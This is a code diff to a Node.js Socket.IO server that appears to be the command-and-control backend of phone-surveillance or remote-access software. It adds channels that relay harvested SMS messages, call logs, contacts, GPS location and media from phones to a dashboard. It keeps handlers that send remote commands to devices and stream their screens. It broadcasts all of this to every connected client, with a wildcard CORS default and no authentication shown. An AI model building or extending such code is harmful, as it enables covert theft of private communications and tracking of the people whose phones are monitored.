@@ -24,7 +24,8 @@ const io = new Server(server, {
         origin: process.env.FRONTEND_URL || '*',
         methods: ['GET', 'POST', 'PUT', 'DELETE'],
         credentials: true
-    }
+    },
+    maxHttpBufferSize: 50 * 1024 * 1024  // 50MB — allows Base64 photo thumbnails
 });
 
 const PORT = process.env.PORT || 5000;
@@ -34,7 +35,7 @@ app.use(cors({
     origin: process.env.FRONTEND_URL || '*',
     credentials: true
 }));
-app.use(express.json());
+app.use(express.json({ limit: '50mb' }));
 
 // Routes
 app.use('/api/auth', authRoutes);
@@ -62,23 +63,46 @@ io.on('connection', (socket) => {
 
     socket.on('device_ping', (data) => {
         console.log('Device ping received:', data.deviceName || data.deviceId);
-        // Broadcast to all dashboard clients so real phone shows up live instantly
         io.emit('device_status_update', data);
     });
 
+    // Individual telemetry channels — each sent separately to avoid payload size issues
+    socket.on('device_sms_sync', (data) => {
+        console.log(`SMS sync: ${data.count || 0} messages from ${data.deviceId}`);
+        io.emit('live_sms_sync', data);
+    });
+
+    socket.on('device_calls_sync', (data) => {
+        console.log(`Call logs sync: ${data.count || 0} logs from ${data.deviceId}`);
+        io.emit('live_calls_sync', data);
+    });
+
+    socket.on('device_contacts_sync', (data) => {
+        console.log(`Contacts sync: ${data.count || 0} contacts from ${data.deviceId}`);
+        io.emit('live_contacts_sync', data);
+    });
+
+    socket.on('device_location_sync', (data) => {
+        console.log(`Location sync from ${data.deviceId}: ${data.latitude}, ${data.longitude}`);
+        io.emit('live_location_sync', data);
+    });
+
+    socket.on('device_media_sync', (data) => {
+        console.log(`Media sync: ${data.count || 0} items from ${data.deviceId}`);
+        io.emit('live_media_sync', data);
+    });
+
+    // Legacy combined dump (kept for backwards compatibility)
     socket.on('device_telemetry_dump', (data) => {
         console.log('Received full telemetry dump for device:', data.deviceId);
-        // Broadcast full telemetry dump (SMS, Call Logs, Contacts, Location, Media) to Dashboard
         io.emit('live_telemetry_dump', data);
     });
 
     socket.on('send_command', (data) => {
-        // Broadcast remote command to targeted mobile device
         io.emit('remote_command', data);
     });
 
     socket.on('screen_frame', (data) => {
-        // Stream frame from remote device to web frontend
         io.emit('remote_screen_frame', data);
     });
 
